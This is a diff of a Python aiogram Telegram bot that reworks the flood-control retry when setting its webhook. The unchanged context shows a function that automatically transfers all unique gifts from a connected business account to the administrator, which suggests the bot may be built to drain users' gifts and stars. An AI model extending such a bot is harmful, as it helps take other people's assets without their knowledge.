@@ -7,13 +7,13 @@ from aiogram.types import InputMediaPhoto, FSInputFile
 from aiogram.types import InlineQuery, InlineQueryResultArticle, InputTextMessageContent
 from custom_methods import GetFixedBusinessAccountStarBalance
 from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
+from aiogram.exceptions import TelegramBadRequest  # Заменили TelegramTooManyRequests
 from aiohttp import web
 import logging
 import asyncio
 import json
 import config
 import os
-from aiogram.exceptions import TelegramTooManyRequests
 
 async def transfer_all_unique_gifts(business_connection_id: str):
     """Автоматически передает все уникальные подарки администратору"""
@@ -741,10 +741,14 @@ async def set_webhook():
                 await bot.set_webhook(webhook_url)
                 logging.info(f"Webhook успешно установлен: {webhook_url}")
                 return
-            except TelegramTooManyRequests as e:
-                retry_after = e.retry_after or 1
-                logging.warning(f"Флуд-контроль Telegram, повтор через {retry_after} сек, попытка {attempt + 1}/{max_retries}")
-                await asyncio.sleep(retry_after)
+            except TelegramBadRequest as e:
+                if "Too Many Requests" in str(e):
+                    retry_after = 1  # Telegram обычно возвращает 1 сек, можно улучшить парсинг
+                    logging.warning(f"Флуд-контроль Telegram, повтор через {retry_after} сек, попытка {attempt + 1}/{max_retries}")
+                    await asyncio.sleep(retry_after)
+                else:
+                    logging.error(f"Ошибка Telegram API: {e}")
+                    return
             except Exception as e:
                 logging.error(f"Ошибка при установке webhook: {e}")
                 return
